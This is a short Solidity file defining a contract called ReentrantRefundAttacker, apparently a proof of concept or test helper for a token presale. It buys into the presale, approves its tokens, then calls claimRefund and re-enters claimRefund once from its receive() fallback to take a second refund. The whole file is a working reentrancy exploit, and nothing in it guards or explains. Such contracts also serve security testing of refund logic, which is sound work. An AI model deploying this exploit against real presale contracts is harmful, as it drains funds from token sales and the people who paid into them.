// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPresale {
    function buy() external payable;
    function claimRefund() external;
}

interface IInfernoToken {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ReentrantRefundAttacker {
    IPresale public immutable presale;
    IInfernoToken public immutable token;
    bool private _reentered;

    constructor(address presale_, address token_) {
        presale = IPresale(presale_);
        token = IInfernoToken(token_);
    }

    receive() external payable {
        if (!_reentered) {
            _reentered = true;
            presale.claimRefund();
        }
    }

    function buyIntoPresale() external payable {
        presale.buy{value: msg.value}();
    }

    function prepareForRefund() external {
        uint256 balance = token.balanceOf(address(this));
        token.approve(address(presale), balance);
    }

    function attackRefund() external {
        presale.claimRefund();
    }
}
